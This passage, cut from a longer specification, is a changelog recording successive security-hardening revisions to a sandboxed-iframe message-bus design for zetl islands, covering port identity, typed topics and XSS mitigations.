  diverges *only* because the untrusted iframe tier cannot import a shared module); **ADR-5002**
  notes replay-on-subscribe **is** Nano Stores' `atom.subscribe` semantics (validation, not
  novelty); §1.2 records that the trusted half mirrors Astro while the sandboxed-content half
  has no prior art (explaining its review risk). No security-model change.

- **0.6.0** (2026-06-25) — *normative; fourth-review fixes (2 Blocking / 5 Major / 6 Minor).*
  **B-1:** removed the self-contradiction the 4th pass caught — REQ-5016/CON-5006/ADR-5008/
  Threat J now consistently describe **one** identity model (child-`zetl:ready`-first bootstrap
  routed by `event.source` `WindowProxy` identity → targeted `port2` transfer → port-object
  identity thereafter); deleted the leftover "no handshake / port is the first message" text.
  **B-2:** specified the parent's `Map<WindowProxy, Island{iframe,port1,port2,grant}>` so the
  bootstrap routes by `event.source` (no cross-island confusion). **M-1:** CON-5001 pins one
  shared anchored ASCII recogniser (build==runtime), chars not bytes. **M-2:** REQ-5017 teardown
  — WeakMap-miss (not `close()`) is the in-flight guard; relays re-check membership; cancel
  debounced timers. **M-3:** REQ-5008 lint is AST-based with named false-pos/neg classes; Threat
  B coverage narrowed. **M-4 (most dangerous, new):** REQ-5022 + Threat M — recognition is
  type-safety not output-safety; subscriber obligation (untrusted-text) + producer restriction
  (content islands publish only `bool`/`int`/`number`/`enum`, never free `string`) close the
  conformant-value XSS path. **M-5 (new):** REQ-5023 separates build-time per-page asset gating
  from the session-persistent SPA-shell bus, resolving the "`window.zetl` iff island"
  contradiction under navigation. Minors: structural-equality coalescing + per-subscriber
  try/catch (REQ-5005), CON-5006 grammar restated as object shapes, iframe-(re)creation cap
  (NFR-5002), TEST-5016 origin/source nuance, added TEST-5022/5023.

- **0.5.0** (2026-06-25) — *normative; third-review (cross-family/codex) fixes (3 Blocking /
  5 Major).* **B1:** CON-5001 made genuinely disjoint — `trusted-first = segment \ "content"`
  (a regular set difference in the DFA), so `content:`/trusted are partitioned structurally,
  not by prose. **B2:** one runtime model — `window.zetl`/bus ⇔ an island is present; a
  persisted-only page emits *only* the pre-paint script (no bus); live `storage` reflection
  requires the bus (REQ-5004/5006/5012, contradiction removed). **B3:** REQ-5016/CON-5006 now
  specify a deterministic **child-ready-first bootstrap** (child posts `zetl:ready` over
  `window`; parent matches `event.source === iframe.contentWindow` then transfers `port2`;
  timeout → one retry → teardown), fixing the lost-port-before-listener race. **M1:** REQ-5017
  teardown is now achievable from the parent (close `port1`, revoke the `WeakMap` grant,
  destroy the iframe → disposes `port2`; optional child `close`) — no impossible "close both
  ends." **M2:** CON-5002 manifest is valid TOML — quoted topic keys, `default` a native TOML
  value of the declared type (not a json-string); CON-5005 clarifies `literal` is enum-only.
  **M3:** `island-topic-undeclared` is an explicit best-effort literal-string **lint** for
  trusted in-realm islands (no island identity in `window.zetl.store`), exact only for content
  islands via the bridge grant table; added Q7. **M4:** TEST-5016 rewritten to the bootstrap/
  port-identity model (no "nonce handshake"/"unhandshaken"). **M5:** Q1 (FOUC) closed — REQ-5018
  is stable normative, not `[Blocked]`.

- **0.4.0** (2026-06-24) — *normative; second adversarial-review fixes.* A second
  fresh-context review (3 Blocking / 5 Major / 6 Minor) found the v0.3.0 bridge fixes
  partly *relocated*, not solved. **B1:** the nonce handshake was theatre — a targeted
  `contentWindow.postMessage([port2])` already prevents interception, and port-object
  identity (`WeakMap`) is the sole discriminator; rewrote REQ-5016 / CON-5006 / ADR-5008 /
  Threat J to specify iframe-element↔port correlation and drop the nonce as a security
  claim (kept only as an optional liveness echo). **B2:** removed the impossible
  "port inside `srcdoc`" delivery. **B3:** the "recognise the JSON token stream, never
  parse-then-check" discipline was unachievable at the in-realm (live value) and bridge
  (structured-clone) sites; CON-5005 now defines **one shared recogniser fed a per-site
  normalised value** (JSON-text parse / clone prototype-check+null-proto rebuild / direct),
  and REQ-5013 splits the security standing (boundary vs in-realm robustness — M5). **M1:**
  REQ-5021 makes the subscribe relay **value-change-only** and stops over-claiming the timing
  channel (Threat K). **M2:** CON-5001 `segment` grammar now structurally forbids a trailing
  `-`. **M3:** added TEST-5007 (bus single-instance survival). **M4:** REQ-5018 pre-paint
  CSP-hash + duplicate-recogniser concern noted. Minors: `int`/`enum`/record edge cases
  (CON-5005), deep-freeze caveat (REQ-5019/Threat L), bridge-subscription cap accounting
  (CON-5006), Threat G-gap note + K/L reorder. Rebased onto `main` so `[[SPEC-048]]` refs
  resolve.
- **0.3.0** (2026-06-24) — *normative; adversarial-review fixes.* Applied a fresh-context
  (cross-model) adversarial review (4 Blocking / 6 Major / 4 Minor). **F1 (most dangerous):**
  the bridge can't identify islands by `MessageEvent.origin`/`source` — a sandboxed frame's
  origin is the literal `"null"` and channel-port `source` is `null`; rewrote REQ-5016 /
  CON-5006 / ADR-5008 / Threat J to identify by **port-object identity** (`WeakMap` keyed
  before transfer) via a **nonce-guarded handshake**. **F3/F8:** completed the LangSec
  grammars — CON-5006 `value` is recognised *as the topic type* (not bare JSON; null-proto,
  `__proto__` rejected) with `ack`/`denied`/`unsubscribe`; CON-5005 now defines `literal`,
  `int`/`number` bounds (reject `NaN`/`Infinity`), and strict flat records. **F4:** CON-5001
  grammar made unambiguous with the `content:`/trusted partition encoded structurally. **F6:**
  added REQ-5017 (port/subscription lifecycle + teardown under SPA nav). **F7:** added
  REQ-5018 (static, self-contained, `sha256`-CSP pre-paint script; acknowledged Principle-7
  exception). **F2:** added REQ-5019 (freeze `window.zetl` + SRI) and Threat L (supply-chain
  residual). **F5:** rate-coalesced subscribe relay + read-disclosure note (REQ-5016, Threat
  K). **F9:** fixed Design Principle 5 (still said "forbidden"). **F10:** CON-5004 uses
  `event.newValue`, handles `null` delete (TOCTOU). **F11/F13:** REQ-5012 gating clause;
  REQ-5008 error taxonomy. **F14:** added REQ-5020 (iframe a11y). Added TEST-5017–5020.
- **0.2.0** (2026-06-24) — *normative; security-model revision.* Replaced the v0.1.0
  "content islands forbidden" stance with a **sandbox + capability + typing** model on
  stakeholder direction: content-author islands now run in an `<iframe sandbox>` (opaque
  origin, no `window.zetl` — REQ-5015) and reach the bus only via a **capability-scoped
  `postMessage` bridge** the parent reference-monitors (REQ-5016, CON-5006); topics are
  **typed** and every payload is recognised at the bus, persisted-read, and bridge
  boundaries (REQ-5013, CON-5005). Trusted theme islands still run in-realm (REQ-5010, two
  tiers). Reversed ADR-5003; added ADR-5007 (typing) + ADR-5008 (bridge-as-capability);
  extended CON-5002 (typed topics + theme-declared subscribe-only grants); added Threats
  H (type confusion), I (sandbox escape), J (postMessage spoofing), K (capability
  over-grant); added TEST-5013/5015/5016. **Resolves Q2 (sandbox) and Q3 (typed)**; adds
  Q6 (iframe cost at scale). Net-new surface still small — realm isolation and the channel
  reuse platform `<iframe sandbox>` + `MessageChannel`.
- **0.1.0** (2026-06-24) — *initial strawman.* Extracted and reframed from the [[SPEC-048]]
  v0.1.1 island/bus clauses (REQ-4810/4816/4817, ADR-4808) that the SPEC-048 v0.2.0
  tightening deferred. Key reframe vs that draft: islands are a **trusted-author-only**
  surface and content-author islands are **forbidden in v1** (ADR-5003/REQ-5010), closing
  the bus-escalation hole by construction rather than by topic-namespace convention; and
  `localStorage`/cross-tab values are treated as **untrusted input** with a recogniser
  (CON-5004/Threat C). Adds the FOUC pre-paint decision (ADR-5005) and bus bounds
  (NFR-5002).

</details>
